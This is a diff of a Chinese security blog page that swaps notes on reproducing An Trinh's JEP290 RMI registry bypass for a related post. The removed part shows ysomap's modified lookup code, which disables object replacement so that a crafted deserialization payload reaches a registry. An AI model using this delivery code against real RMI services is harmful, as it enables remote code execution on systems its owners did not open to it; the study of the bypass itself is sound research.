-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Target var6 = <span class="keyword">new</span> Target(var1, <span class="keyword">this</span>, var5, <span class="keyword">this</span>.ref.getObjID(), var3);</span><br><span class="line"><span class="keyword">this</span>.ref.exportObject(var6);</span><br></pre></td></tr></table></figure>
-
-<pre><code>其中this.ref为上面的LiveRef，var5为Proxy[Remote,RemoteObjectInvocationHandler[UnicastRef2 [liveRef: [endpoint:[localhost:0,Proxy[RMIServerSocketFactory,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:10999](remote),objID:[0:0:0, 534121287]]]]]](local),objID:[-e331dff:173958b39d9:-7ffe, -3106094860174826018]]]]]</code></pre>
-<p>LiveRef$exportObject</p>
-<p><img src="/images/pasted-103.png" alt="upload successful"></p>
-<p>接下来没什么重要的，直到建立TCP连接并监听</p>
-<ol start="3">
-<li>TCPEndpoint$newServerSocket</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(<span class="keyword">this</span>.listenPort);</span><br></pre></td></tr></table></figure>
-<pre><code>这里需要注意的是，var1为前文的代理，值为上文的serverSocketFactory，具体值为Proxy[RMIServerSocketFactory,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:10999](remote),objID:[0:0:0, 534121287]]]]]
-
-serverSocketFactory.所有方法（当让包括createServerSocket）动态代理到RemoteObjectInvoationhandler的invoke，对应POC处的代码</code></pre>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">            RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">            <span class="keyword">new</span> Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">            handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
-
-<p>所以下一步是会是</p>
-<p>RemoteObjectInvocationHandler$invoke</p>
-<p>RemoteObjectInvocationHandler$invokeRemoteMethod</p>
-<ol start="3">
-<li>RemoteObjectInvocationHandler$invokeRemoteMethod</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private Object invokeRemoteMethod(Object proxy,</span><br><span class="line">                                  Method method,</span><br><span class="line">                                  Object[] args)</span><br><span class="line">    throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (!(proxy instanceof Remote)) &#123;</span><br><span class="line">            throw new IllegalArgumentException(</span><br><span class="line">                &quot;proxy not Remote instance&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                          getMethodHash(method));</span><br></pre></td></tr></table></figure>
-
-<p>UnicastRef$invoke</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var7.executeCall();</span><br></pre></td></tr></table></figure>
-
-<p>这里和原JEP290的就不一样的，虽然都有用到这个类，但是原来的调用链用到的是UnicastRef$readExternal，这里就不一样了，executeCall会进入到StreamRemoteCall.executeCall流程，也就是前文的经常提及的触发点。</p>
-<h4 id="如何发送序列化Payload"><a href="#如何发送序列化Payload" class="headerlink" title="如何发送序列化Payload"></a>如何发送序列化Payload</h4><p>前文的test_bypass_jep290_plus 中构造了可利用的remoteObject，没有提及如何发送给Vuln Registry，为了简化直接使用的</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改之后的lookup</span></span><br><span class="line">      Naming.lookup(registry, remoteObject);</span><br></pre></td></tr></table></figure>
-<p>那么为什么不用以下的</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">registry.lookup(remoteObject);</span><br><span class="line">registry.bind(<span class="string">&#x27;test&#x27;</span>,remoteObject)</span><br></pre></td></tr></table></figure>
-
-<p>这两个是因为不同的原因，依次单独来讲</p>
-<h5 id="实现lookup-object"><a href="#实现lookup-object" class="headerlink" title="实现lookup(object)"></a>实现lookup(object)</h5><p>lookup只接受String类型的参数，直接传object肯定不行，参考【1】中提及了直接改包，比较直接暴力这里不深入跟进</p>
-<p>还有一种是ysomap中重写lookup函数的方式，来看看具体实现</p>
-<p>ysomap.core.exploit.rmi.component.Naming#lookup</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 段1</span></span><br><span class="line">        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> interfaceHash = (<span class="keyword">long</span>) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;interfaceHash&quot;</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            	<span class="comment">// 段2</span></span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                <span class="comment">//反射修改enableReplace</span></span><br><span class="line">                ReflectionHelper.setFieldValue(out, <span class="string">&quot;enableReplace&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">                out.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | RemoteException | NotBoundException e) &#123;</span><br><span class="line">            <span class="keyword">if</span>(e <span class="keyword">instanceof</span> RemoteException| e <span class="keyword">instanceof</span> ClassCastException)&#123;</span><br><span class="line">                Logger.success(<span class="string">&quot;exploit remote registry success!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>对比下sun.rmi.registry.RegistryImpl_Stub$lookup</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="comment">// 其实只实现了这段逻辑</span></span><br><span class="line">            <span class="comment">// ----------start----------</span></span><br><span class="line">            RemoteCall var2 = <span class="keyword">this</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">			</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, var17);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ref.invoke(var2);</span><br><span class="line">            <span class="comment">// ----------end----------</span></span><br><span class="line"></span><br><span class="line">            Remote var22;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectInput var4 = var2.getInputStream();</span><br><span class="line">                var22 = (Remote)var4.readObject();</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>可以发现：</p>
-<ol>
-<li>ysomap Naming$lookup其实只实现到发送ref.invoke</li>
-<li>段1通过反射，获取RemoteCall</li>
-<li>注意段2有给out增加属性enableReplace=false;发送的是Object类型的obj，而不是原来的String</li>
-</ol>
-<p>其中enableReplace=false有深意</p>
-<h5 id="enableReplace-false"><a href="#enableReplace-false" class="headerlink" title="enableReplace=false"></a>enableReplace=false</h5><p><strong>这里很重要</strong></p>
-<p>强烈建议阅读参考【1】原文关于enableReplace 这一段，这里就直接引用相关重要结论</p>
-<ul>
-<li><blockquote>
-<p>我们默认理解为序列化过程是对于我们的恶意object进行writeobject，RMIConnectionImpl_Stub.writeobject()、UnicastRemoteObject.writeobject()那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）</p>
-</blockquote>
+<li><p>实例{ConnectionInputStream@1023}.readObject()<br><img src="/images/pasted-83.png" alt="upload successful"></p>
 </li>
-<li><blockquote>
-<p>但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)</p>
-</blockquote>
+<li><p>POC中的 LiveRef(id, te, false)反序列化</p>
+<p> LiveRef.read(var0={ConnectionInputStream@1023})<br><img src="/images/pasted-85.png" alt="upload successful"></p>
 </li>
-</ul>
-<p>java.io.ObjectOutputStream#writeObject0</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">        depth++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//一大堆类型检查，都不会通过</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 想要去检查替换我们的object</span></span><br><span class="line">            Object orig = obj;</span><br><span class="line">            Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">            ObjectStreamClass desc;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">//查找相关内容</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (enableReplace) &#123;<span class="comment">//都是true</span></span><br><span class="line">            <span class="comment">//!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！</span></span><br><span class="line">                Object rep = replaceObject(obj);</span><br><span class="line">                <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    cl = rep.getClass();</span><br><span class="line">                    desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                obj = rep;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//一些替换后的处理，不太重要</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过类进行分配序列化过程</span></span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                writeString((String) obj, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">                writeArray(obj, desc, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">                writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">                <span class="comment">//进入此处再开始正常的序列化</span></span><br><span class="line">                writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">            <span class="comment">//...省略...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>replaceobject替换的方法具体在sun.rmi.server.MarshalOutputStream#replaceObject中</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1就是我们想要序列化的类</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title">replaceObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//这个类要是Remote接口的，并且不是RemoteStub接口的，为true</span></span><br><span class="line">    <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote &amp;&amp; !(var1 <span class="keyword">instanceof</span> RemoteStub)) &#123;</span><br><span class="line">        <span class="comment">//这里会去获取到新的对象来替换</span></span><br><span class="line">        <span class="comment">//UnicastRemoteObject走的就是这条路</span></span><br><span class="line">        Target var2 = ObjectTable.getTarget((Remote)var1);</span><br><span class="line">        <span class="keyword">if</span> (var2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> var2.getStub();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//RMIConnectionImpl_Stub走的就是这条路</span></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="通过bind攻击"><a href="#通过bind攻击" class="headerlink" title="通过bind攻击"></a>通过bind攻击</h5><p>理解以上的原理，lookup适用的bind同样适用，ysomap Naming增加同样的bind函数即可。</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节只能算是参考【1】中的jep290 An Trinh方式的复现笔记，其间几个重点类的构造巧妙，只能通过正向调试分析为什么可以，至于逆向分析为什么会想到这个思路，顶礼膜拜，不能望其项背。</p>
-<p>还有8u241等知识点未复现，之后有空再作记录。</p>
+<li><p>继续调用{ConnectionInputStream@1023}.saveRef, incomingRefTable被更新<br><img src="/images/pasted-84.png" alt="upload successful"></p>
+</li>
+</ol>
+<h4 id="RemoteObjectInvocationHandler"><a href="#RemoteObjectInvocationHandler" class="headerlink" title="RemoteObjectInvocationHandler"></a>RemoteObjectInvocationHandler</h4><p>如何将UnicastRef在Register上反序列化，bind参数为Remote类型，不能直接传UnicastRef。</p>
+<p>参考【2】，给出了寻找RemoteObjectInvocationHandler 的过程，利用Proxy 和Handler 动态转换，是很典型的反序列化利用手段。原文讲的很详细了，而且发现了其他几个 衔接类，具体参考原文。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节详细跟踪了JEP290的绕过流程，发现并不是简单的JRMP连接+Registry攻击Server的原理，而是因为DGC机制、StreamRemoteCall、incomingRefTable一些更为复杂的逻辑。</p>
+<p>发现者需要对RMI、DGC的逻辑有深刻的了解，很是赞叹与崇拜。与其相比，发现RemoteObjectInvocationHandler都只是反序列化利用基础知识而已。</p>
+<p>高山仰止</p>
+<p>参考【1】中提到还有8u231之后还有修复及绕过，留待下篇再学习吧</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7932#toc-6">针对RMI服务的九重攻击 - 下</a></li>
-<li>[2] <a target="_blank" rel="noopener" href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/">AN TRINHS RMI REGISTRY BYPASS</a></li>
-<li>[3] <a target="_blank" rel="noopener" href="https://java.com/zh_CN/download/faq/release_changes.xml">Java 8 发行版要点说明</a></li>
-<li>[4] <a target="_blank" rel="noopener" href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">一次攻击内网rmi服务的深思</a></li>
-<li>[5] <a target="_blank" rel="noopener" href="http://code2sec.com/javafan-xu-lie-hua-lou-dong-xue-xi-shi-jian-san-li-jie-javade-dong-tai-dai-li-ji-zhi.html">Java反序列化漏洞学习实践三：理解java的动态代理机制</a></li>
+<li>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7932">针对RMI服务的九重攻击 - 下</a></li>
+<li>[2] <a target="_blank" rel="noopener" href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">一次攻击内网rmi服务的深思</a></li>
 </ul>
 
       
@@ -370,10 +305,6 @@ serverSocketFactory.所有方法（当让包括createServerSocket）动态代理
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">JEP290</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">enableReplace</a>
         		</li>
       		
 		</ul>
@@ -403,18 +334,18 @@ serverSocketFactory.所有方法（当让包括createServerSocket）动态代理
   
 <nav id="article-nav">
   
-    <a href="/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/07/15/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          ysoserial工具分析：TemplatesImpl链与代码执行
+          RMI：绕过JEP290——下
         
       </div>
     </a>
   
   
-    <a href="/2020/07/23/JNDI-LDAP%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E2%80%94%E2%80%94%E4%B8%8A/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JNDI：JNDI-LDAP 注入及高版本JDK限制——上</div>
+    <a href="/2020/07/02/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8A/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RMI：绕过JEP290——上</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -441,7 +372,7 @@ serverSocketFactory.所有方法（当让包括createServerSocket）动态代理
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JEP290-JRMP%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">JEP290 JRMP绕过原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8u231%E9%99%90%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">8u231限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#An-Trinh%E7%9A%84RMI%E6%B3%A8%E5%86%8C%E7%AB%AF%E7%9A%84Bypass%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">An Trinh的RMI注册端的Bypass方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E9%80%81%E5%BA%8F%E5%88%97%E5%8C%96Payload"><span class="toc-number">1.2.3.</span> <span class="toc-text">如何发送序列化Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0lookup-object"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">实现lookup(object)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#enableReplace-false"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">enableReplace&#x3D;false</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87bind%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">通过bind攻击</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">1.</span> <span class="toc-text">结论</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8bind-%E7%9A%84%E4%BA%A4%E4%BA%92%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">正常bind 的交互流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Server%E7%AB%AF%E9%80%BB%E8%BE%91"><span class="toc-number">2.1.1.</span> <span class="toc-text">1. Server端逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Registry%E9%80%BB%E8%BE%91"><span class="toc-number">2.1.2.</span> <span class="toc-text">2. Registry逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96StreamRemoteCall-in-incomingRefTable"><span class="toc-number">2.2.</span> <span class="toc-text">覆盖StreamRemoteCall.in.incomingRefTable</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RemoteObjectInvocationHandler"><span class="toc-number">2.2.1.</span> <span class="toc-text">RemoteObjectInvocationHandler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -724,6 +655,10 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Mysql</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">MySQL</a>
               </li>
              
@@ -761,6 +696,18 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">RASP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XXE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Fabric</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">CodeQL</a>
               </li>
             
             <div class="clearfix"></div>
